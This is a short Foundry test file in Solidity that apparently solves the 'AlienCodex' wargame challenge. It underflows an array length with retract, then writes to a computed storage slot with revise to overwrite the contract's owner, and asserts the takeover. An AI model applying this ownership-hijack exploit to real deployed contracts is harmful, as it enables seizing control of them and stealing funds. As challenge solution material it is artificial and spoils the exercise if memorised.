pragma solidity ^0.6.0;

import {Test} from "forge-std/Test.sol";
import "../src/AlienCodex.sol";

contract AlienCodexTest is Test {
    AlienCodex public aliencodex;

    function setUp() public {
        aliencodex = new AlienCodex();
    }

    function testAttack() public {
        aliencodex.makeContact();
        aliencodex.retract();
        aliencodex.revise(
            72412505182528709039998379046085362850601968682154630550920834895083236163630,
            bytes32(address(this))
        );
        assertEq(aliencodex.owner(), address(this), "Must have expected owner");
    }
}